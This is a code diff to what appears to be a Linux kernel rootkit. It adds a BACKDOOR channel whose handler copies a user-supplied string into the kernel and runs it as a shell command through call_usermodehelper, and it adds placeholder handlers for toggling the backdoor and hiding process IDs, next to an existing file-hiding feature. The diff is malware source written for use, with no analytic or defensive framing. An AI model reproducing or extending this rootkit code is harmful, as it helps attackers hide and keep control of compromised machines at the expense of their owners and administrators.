@@ -29,6 +29,9 @@ detect_channel(unsigned cmd)
     switch (cmd) {
     case G7_PING:     return (channel_t){ "PING",     handle_ping     };
     case G7_FILEHIDE: return (channel_t){ "FILEHIDE", handle_filehide };
+    case G7_BACKDOOR: return (channel_t){ "BACKDOOR", handle_backdoor };
+    case G7_TOGGLEBD: return (channel_t){ "TOGGLEBD", handle_togglebd };
+    case G7_HIDEPID:  return (channel_t){ "HIDEPID",  handle_hidepid  };
     }
 
     return (channel_t){ "unknown", NULL };
@@ -66,6 +69,48 @@ handle_filehide(unsigned long arg)
     }
 
     DEBUG_NOTICE("filehide %s\n", rootkit.hiding_files ? "on" : "off");
+
+    return 0;
+}
+
+int
+handle_backdoor(unsigned long arg)
+{
+    char buf[BUFLEN];
+
+    if (!(const char *)arg)
+        return -ENOTTY;
+
+    copy_from_user(buf, (const char *)arg, BUFLEN);
+
+    char *argv[] = {
+        "/bin/sh",
+        "-c",
+        buf,
+        NULL
+    };
+
+    static char *envp[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+        NULL
+    };
+
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    return 0;
+}
+
+int
+handle_togglebd(unsigned long arg)
+{
+
+    return 0;
+}
+
+int
+handle_hidepid(unsigned long arg)
+{
 
     return 0;
 }
